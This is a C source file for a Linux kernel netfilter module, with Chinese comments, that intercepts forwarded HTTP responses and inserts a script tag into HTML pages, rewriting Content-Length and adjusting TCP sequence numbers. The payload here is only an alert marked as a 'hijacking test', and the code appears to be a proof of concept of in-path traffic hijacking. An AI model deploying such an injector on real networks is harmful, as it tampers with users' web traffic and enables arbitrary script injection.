/* netfilter修改HTTP数据包（插入、修改、删除） */

// 测试内核：3.13.0-32-generic
// 修改数据包长度后3.13内核可自动修改seq和ack
// 3.2以及2.68以下内核只是在ct->status中高几位做了标记（IPS_SEQ_ADJUST_BIT），还需要后续手动hook修改

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>

#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_seqadj.h>
#include <net/netfilter/nf_nat_helper.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");

// 待插入字符串
char code[] = "<script>alert('------------------------------------hijacking test-----------------------')</script>\n";

int build_dev_xmit_tcp (struct net_device* dev, 
			 u_char * smac, u_char * dmac,
             u_char * pkt, int pkt_len, 
             u_long sip, u_long dip, 
             u_short sport, u_short dport, 
             u_long seq, u_long ack_seq, 
             u_char syn, u_char ack, u_char psh, u_char fin)
{
	struct sk_buff * skb = NULL;
	// struct net_device * dev = NULL;
	struct ethhdr * ethdr = NULL;
	struct iphdr * iph = NULL;
	struct tcphdr * tcph = NULL;
	u_char * pdata = NULL;
	int nret = 1;
	
	if (NULL == smac || NULL == dmac) goto out;
	
	// dev = dev_get_by_name(&init_net, eth);

	if (NULL == dev) goto out;
	
	skb = alloc_skb (pkt_len + sizeof (struct iphdr) + sizeof (struct tcphdr) + LL_RESERVED_SPACE (dev), GFP_ATOMIC);
	/*
	LL_RESERVED_SPACE(dev) = 16
	alloc_skb返回以后，skb->head = skb_data = skb->tail = alloc_skb分配的内存区首地址,skb->len = 0;
	skb->end = skb->tail + size;
	注：我的机子是32位x86机器，所以没有定义NET_SKBUFF_DATA_USES_OFFSET，因而，
	skb->tail,skb->mac_header,skb->network_header,skb->transport_header这几个成员都是指针
	*/
	if (NULL == skb)
		goto out;
	skb_reserve (skb, LL_RESERVED_SPACE (dev));//add data and tail
	skb->dev = dev;
	skb->pkt_type = PACKET_OTHERHOST;
	skb->protocol = __constant_htons(ETH_P_IP);
	skb->ip_summed = CHECKSUM_NONE;
	skb->priority = 0;
	//skb->nh.iph = (struct iphdr*)skb_put(skb, sizeof (struct iphdr));
	//skb->h.th = (struct tcphdr*)skb_put(skb, sizeof (struct tcphdr));
	skb_set_network_header(skb, 0); //skb->network_header = skb->data + 0;
	skb_put(skb, sizeof (struct iphdr)); //add tail and len
	skb_set_transport_header(skb, sizeof (struct iphdr));//skb->transport_header = skb->data + sizeof (struct iphdr)
	skb_put(skb, sizeof (struct tcphdr));
	pdata = skb_put (skb, pkt_len);
	{
		if (NULL != pkt)
		memcpy (pdata, pkt, pkt_len);
	}

	{
		tcph = tcp_hdr(skb);
		memset (tcph, 0, sizeof (struct tcphdr));
		tcph->source = sport;
		tcph->dest = dport;
		tcph->seq = seq;
		tcph->ack_seq = ack_seq;
		tcph->doff = 5;
		tcph->psh = psh;
		tcph->fin = fin;
		tcph->syn = syn;
		tcph->ack = ack;
		tcph->window = __constant_htons (5840);
		skb->csum = 0;
		tcph->check = 0;
	}

	{
		iph = ip_hdr(skb);
		iph->version = 4;
		iph->ihl = sizeof(struct iphdr)>>2;
		iph->frag_off = 0;
		iph->protocol = IPPROTO_TCP;
		iph->tos = 0;
		iph->daddr = dip;
		iph->saddr = sip;
		iph->ttl = 0x40;
		iph->tot_len = __constant_htons(skb->len);
		iph->check = 0;
	}
	skb->csum = skb_checksum (skb, iph->ihl*4, skb->len - iph->ihl * 4, 0);
	tcph->check = csum_tcpudp_magic (sip, dip, skb->len - iph->ihl * 4, IPPROTO_TCP, skb->csum);
	{
		ethdr = (struct ethhdr*)skb_push (skb, 14);//reduce data and add len
		// memcpy (ethdr->h_dest, dmac, ETH_ALEN);
		// memcpy (ethdr->h_source, smac, ETH_ALEN);
		ethdr->h_proto = __constant_htons (ETH_P_IP);
	}
	nret = dev_queue_xmit(skb);
	if (0 > nret) goto out;
	printk("+++ack ret: %d\n", nret);

	out:
	if (0 != nret && NULL != skb)
	{
		dev_put (dev);
		kfree_skb (skb);
	}
	return (nret);
}

// 钩子函数，发送时修改请求头，接收时修改pkg
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	int codeLen = strlen(code);
	// IP数据包frag合并
	if (0 != skb_linearize(skb)) {
		return NF_ACCEPT;
	}
	struct iphdr *iph = ip_hdr(skb);
	unsigned int tot_len = ntohs(iph->tot_len);
	unsigned int iph_len = ip_hdrlen(skb);

	unsigned int saddr = (unsigned int)iph->saddr;
	unsigned int daddr = (unsigned int)iph->daddr;

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void*)iph + iph->ihl*4;
		unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
		// 接收到的数据包
		if (sport == 80)
		{
			// if(tcph->ack == 1 && tcph->psh == 0 && tcph->fin == 0 && tcph->syn == 0)
			// 	return NF_DROP;
			// 处理HTTP请求且请求返回200
			if (memcmp(pkg,"HTTP/1.1 200", 12) == 0 || memcmp(pkg,"HTTP/1.0 200", 12) == 0)
			{
				char* pK = strstr(pkg,"Content-Type: text/html");
				if(pK == NULL)	return NF_ACCEPT;

				pK = strstr(pkg,"<html");
				if(pK == NULL)	return NF_ACCEPT;

				printk("--------------------------\n");
				printk("step 2. start change content-len\n");

				tcph->psh = 1;
				/////////////////////change content len////////////////////////
				char* pr1 = strstr(pkg,"Content-Length: ");
				if(pr1 == NULL)	return NF_ACCEPT;
				pr1 += 16;

				char *pr2 = pr1;
				while(*pr2 != '\r')
				{
					pr2++;
				}
				char *content_len_str = (char*)kmalloc(pr2 - pr1 + 1, GFP_KERNEL);
				memcpy(content_len_str, pr1, pr2 - pr1);
				memset(content_len_str + (pr2 - pr1), '\0', 1);
				
				int content_len; 
				sscanf(content_len_str, "%d", &content_len);

				printk("%d -->", content_len);

				content_len += codeLen;
				sprintf(content_len_str, "%d", content_len);
				printk(" %d\n", content_len);

				memcpy(pr1, content_len_str, strlen(content_len_str));
				kfree(content_len_str);
				//////////////////////////////////////////////////////////////
				

				// char *pHtml = strstr(pkg,">");
				// if(pHtml == NULL) return NF_ACCEPT;
				printk("--------------------------\n");
				printk("step 3. start change response seq\n");
				printk("old seq: %X %ld\n", ntohl(tcph->seq),ntohl(tcph->seq));
		  		// tcph->seq = htonl(ntohl(tcph->seq) - codeLen);
				printk("new seq: %X %ld\n", ntohl(tcph->seq),ntohl(tcph->seq));


				printk("--------------------------\n");
				printk("step 4. start send new ack skb\n");
				
				// struct ethhdr* eth = (struct ethhdr*)skb->mac_header;
				// build_dev_xmit_tcp (skb->dev, 
				// 	eth->h_source, eth->h_dest,
				// 	NULL, 0, 
    //                 saddr,daddr,
    //                 tcph->source,tcph->dest,
    //                 tcph->seq, tcph->ack_seq,
    //                 0, 1, 0, 0);


				
				printk("--------------------------\n");
				printk("step 5. start insert data\n");

				tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);
				printk(">>>old tcp len: %d\n", tcplen);
				printk("skb linear: %d\n",skb_is_nonlinear(skb));

				enum ip_conntrack_info ctinfo;
				struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
				// 3.1内核，手动引入nfct_seqadj，使能够自动修改seq以及ack
				nfct_seqadj_ext_add(ct);
				if (ct && __nf_nat_mangle_tcp_packet(skb, 
							ct, 
							ctinfo,
							iph->ihl * 4, 
							(int)(pK - pkg), 
							0,
							code, 
							codeLen, 1)) 
				{
					printk(KERN_ALERT "---pkg modify success---\n");
				}


				// 尝试不使用nf_nat_mangle_tcp_packet，手动扩容
				// -------------------------------------------------
				// int eat = (skb->tail+codeLen) - skb->end;
				// printk("eat: %d\n", eat);
				
				// skb扩容，在尾部增加codeLen长度
				// 参考：http://book.51cto.com/art/201206/345049.htm
				// pskb_expand_head(skb, 0, codeLen, GFP_ATOMIC);

				// pTail指针向后移动，增加data长度 
				// 参考：http://bbs.chinaunix.net/thread-1941060-1-1.html
				// skb_put(skb, codeLen);
				// 原数据整体向后移动
				// while(pTail >= pHtml + codeLen)
				// {
				// 	*pTail = *(pTail - codeLen);
				// 	pTail--;
				// }
				// 在首部增加code
				// memcpy(pK, code, codeLen);
				tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);
				printk(">>>new tcp len: %d\n", tcplen);


				// 重新计算校验和
				//-------------------------------------
				// int datalen = skb->len - iph->ihl*4;
				// skb->ip_summed = CHECKSUM_PARTIAL;
				// skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
				// skb->csum_offset = offsetof(struct tcphdr, check);
				// // ip
				// iph->check = 0;
				// iph->check = ip_fast_csum(iph, iph->ihl);
				// // tcp
				// tcph->check = 0;
				// tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
				// 				datalen, iph->protocol, 0);
				// //-------------------------------------
				return NF_ACCEPT;
			}
			// else
			// {
				
				// char* pK = strstr(pkg,"</html>");
				// if(pK == NULL)	return NF_ACCEPT;

				// int ret = 0;

				// struct sk_buff* nskb = skb_copy(skb, GFP_ATOMIC);

				// struct iphdr *niph = ip_hdr(nskb);
				// struct tcphdr *ntcph = (void *)niph + niph->ihl*4;

				// unsigned int ntot_len = ntohs(niph->tot_len);
				// unsigned int niph_len = ip_hdrlen(nskb);
				// unsigned int ntcplen = nskb->len - (niph->ihl*4) - (ntcph->doff*4);


				// // skb_pull(nskb, niph_len);

				// if(nskb == NULL)
				// {
				// 	printk("%s\n", "skb_copy return NULL");
				// 	return NF_ACCEPT;
				// }

				// printk("seq: %X %ld\n", ntohl(ntcph->seq),ntohl(ntcph->seq));
				// printk("ack: %X %ld\n", ntohl(ntcph->ack_seq),ntohl(ntcph->ack_seq));
				// printk("source: %pI4\n", &niph->saddr);

				// printk("len: %d\n", ntcplen);
				
				// dev_hold(nskb->dev);
				// printk("dev: %s --hold ok\n", nskb->dev);


				// nskb->mac_header = skb_push(nskb, ETH_HLEN);
				// // nskb->dev = in;
				// nf_ct_attach(nskb, skb);

				// struct ethhdr* eth = (struct ethhdr*)skb_mac_header(skb);
				// struct ethhdr* neth = (struct ethhdr*)nskb->mac_header;		
				
				// printk("dest mac: %X\n", eth->h_dest);
				// printk("ndest mac: %X\n", neth->h_dest);

				// memcpy(neth->h_dest, eth->h_dest, ETH_ALEN);
				// memcpy(neth->h_source, eth->h_source, ETH_ALEN);
				// // printk("nsource mac: %X\n", neth->h_source);

				// printk("dest mac: %X\n", eth->h_dest);
				// printk("ndest mac: %X\n", neth->h_dest);

				// skb_push(nskb, niph_len);

				// tcp
				// ntcph->check = 0;			
				// nskb->csum = csum_partial((unsigned char*)ntcph , ntot_len-niph_len, 0);
				// ntcph->check = csum_tcpudp_magic(niph->saddr, niph->daddr,
				// 				ntohs(niph->tot_len)-niph_len, niph->protocol, nskb->csum);
				// // ip
				// niph->check = 0;
				// niph->check = ip_fast_csum(niph, niph->ihl);
				// // skb
				// // nskb->ip_summed = CHECKSUM_NONE;
				// // nskb->pkt_type = PACKET_OTHERHOST;

				// ret = dev_queue_xmit(nskb);
				// printk("ret:%d\n", ret);

				// tcph->seq = htonl(ntohl(tcph->seq) + tcplen);
			// }

			// NF_HOOK(PF_INET, NF_INET_POST_ROUTING, nskb, NULL, nskb->dev, dst_output);
			// return NF_ACCEPT;
		}
		// 发出的数据包
		// else if (dport == 80)
		// {
		// 	if(strstr(pkg,"HTTP/1.1") == NULL && strstr(pkg,"HTTP/1.0") == NULL) 
		// 		return NF_ACCEPT;

		// 	// 只处理GET请求
		// 	if (memcmp(pkg,"GET",3) != 0)	
		// 		return NF_ACCEPT;

		// 	printk("--------------------------\n");
		// 	printk("step 1. start change GET ack\n");
		// 	printk("old ack: %X %ld\n", ntohl(tcph->ack_seq),ntohl(tcph->ack_seq));
		// 	tcph->ack_seq = htonl(ntohl(tcph->ack_seq) - codeLen);
		// 	printk("new ack: %X %ld\n", ntohl(tcph->ack_seq),ntohl(tcph->ack_seq));
			
		// 	printk("old seq: %X %ld\n", ntohl(tcph->seq),ntohl(tcph->seq));
		//  //  	tcph->seq = htonl(ntohl(tcph->seq) - codeLen);
		// 	// printk("new seq: %X %ld\n", ntohl(tcph->seq),ntohl(tcph->seq));



		// 	// 重新计算校验和
		// 	//-------------------------------------
		// 	int datalen = skb->len - iph->ihl*4;
		// 	skb->ip_summed = CHECKSUM_PARTIAL;
		// 	skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
		// 	skb->csum_offset = offsetof(struct tcphdr, check);
		// 	// ip
		// 	iph->check = 0;
		// 	iph->check = ip_fast_csum(iph, iph->ihl);
		// 	// tcp
		// 	tcph->check = 0;
		// 	tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
		// 					datalen, iph->protocol, 0);
		// 	//-------------------------------------
		// }
	}
	return NF_ACCEPT;
}

// 钩子函数注册
static struct nf_hook_ops http_hooks[] = {
	{
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_FORWARD, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	}
};

// 模块加载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
